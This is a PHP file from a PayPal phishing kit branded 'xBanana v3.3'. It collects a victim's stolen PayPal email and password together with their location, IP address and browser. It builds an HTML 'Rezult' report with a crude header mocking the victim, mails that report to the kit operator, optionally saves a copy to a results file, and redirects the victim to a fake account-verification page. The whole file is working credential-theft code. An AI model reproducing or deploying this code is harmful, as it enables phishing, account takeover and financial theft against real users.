<?php
                                                   

session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Email.php');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
include('../../functions/get_ip.php');

$xBanana_MESSAGE .= "
     
		<head>
        <title>🍌 xBanana v3.3 Rezult 🍌</title>
        <style type='text/css'>
            div{
                width:800px;
                background-color: rgb(36,46,60);
                border:3px solid rgb(255,255,0);
                margin:0 auto 8px ;
                padding:0;
                border-radius:10px;
                font-family: Candara ,HelveticaNeue,'Helvetica Neue',Helvetica,Arial;
            }
            img{
                padding-left: 8px;
            }
            td{
              color: white;
            }
        </style>
    </head>
    <body>
    <div >
            <span style='display:block;border-bottom:2px solid rgb(255,255,0); padding: 8px 20px;color: Yellow;'>
                <table width='100%'>
                    <tr>
                        <td><h5 style='margin:0;color: Yellow;'>🍌 xBanana v3 New PayPal Logs 🍌 <span style='color: rgb(255,255,0);'></span> From [<span style='color: rgb(255,255,0);'>".$_SESSION['_LOOKUP_COUNTRY_']."</span>]</h5></td>
                        <td align='right'><span style='font-size:12px;font-family: Verdana;'>".$TIME_DATE."</span></td>
                    </tr>
                </table>
            </span>
            <span style='display:block;padding: 7px 25px;'>
              <table style='font-size:14px;color:#444;margin-bottom:5px; border-collapse:collapse; padding-left:10px; padding-right:10px; padding-top:5px; padding-bottom:5px' border='1' bordercolorlight='#808080' bordercolordark='#808080'>
                <tr>
                  <td colspan='3'>
					<p align='center'><b><font color='#009900'>🍌 xBanana v3.3 Paypal Login 🍌</font></b></td>
                </tr>                
 <tr>
                  <td>🍌 PP Email 🍌</td>
                  <td>:</td>
                  <td style='color: rgb(255,255,0);'>".$_SESSION['_login_email_']."</td>
                </tr>
                <tr>
                  <td>🍌 PP Password 🍌</td>
                  <td>:</td>
                  <td style='color: rgb(255,255,0);'>".$_SESSION['_login_password_']."</td>
                </tr>
                <tr>
                  <td colspan='3'>
					<p align='center'><b><font color='#009900'>🍌 Network Informations 🍌</font></b></td>
                </tr>
                
                <tr>
                  <td><span>🍌 City 🍌</span></td>
                  <td>:</td>
                  <td style='color: rgb(255,255,0);'>".$_SESSION['_LOOKUP_CITY_']."</td>
                </tr>
                <tr>
                  <td><span>🍌 State 🍌</span></td>
                  <td>:</td>
                  <td style='color: rgb(255,255,0);'>".$_SESSION['_LOOKUP_REGIONS_']."</td>
                </tr>
                <tr>
                  <td><span>🍌 Zip Code 🍌</span></td>
                  <td>:</td>
                  <td style='color: rgb(255,255,0);'>".$_SESSION['_LOOKUP_ZIPCODE_']."</td>
                </tr>
                <tr>
                  <td colspan='3'>
					<p align='center'><b><font color='#009900'>🍌 Bitch Fucked 🍌</font></b></td>
                </tr>
                <tr>
                  <td><span>🍌 IP Info 🍌</span></td>
                  <td>:</td>
                  <td style='color: rgb(255,255,0);'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</td>
                </tr>
                                <tr>
                  <td><span>🍌 Browser 🍌</span></td>
                  <td>:</td>
                  <td style='color: rgb(255,255,0);'>".xBanana1_Browser($_SERVER['HTTP_USER_AGENT'])." On ".xBanana1_OS($_SERVER['HTTP_USER_AGENT'])."</td>
                </tr>
            </table>
        </span>
		        </span>
				<hr color='#FFFF00'>
            <span style='display:block;border-bottom:2px solid rgb(255,255,0); padding: 8px 20px;color: Yellow;'>
                <table width='100%'>
                    <tr>
                        <td><h5 style='margin:0;color: Yellow;'><span style='color: rgb(255,255,0);'>
						🍌 Coded By Chul Soo 🍌</span></h5></td>
                        <td align='right'><span style='font-size:12px;font-family: Verdana;'></span></td>
                    </tr>
                </table>
            </span>
    </div>
</body>
\n";

        $xBanana_SUBJECT = "🍌 xBanana Paypal Logs 🍌 [".$_POST['login_email']."] FROM [".$_SESSION['_forlogin_']."]";
        $xBanana_HEADERS .= "From:🍌 xBanana v3.3 🍌 <noreply@r00t.xBanana>";
        $xBanana_HEADERS .= $_POST['eMailAdd']."\n";
        $xBanana_HEADERS .= "MIME-Version: 1.0\n";
        $xBanana_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
       
        @mail($xBanana_EMAIL, $xBanana_SUBJECT, $xBanana_MESSAGE, $xBanana_HEADERS);
		if($ChulSooRezHtml == "on"){
$fl = fopen("../../../../Rezult/BananaZumba-".$_SESSION['_login_email_']."--".$_SESSION['_ip_'].".html","a");
fwrite($fl,$xBanana_MESSAGE);
}

		HEADER("Location: ../settings/?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>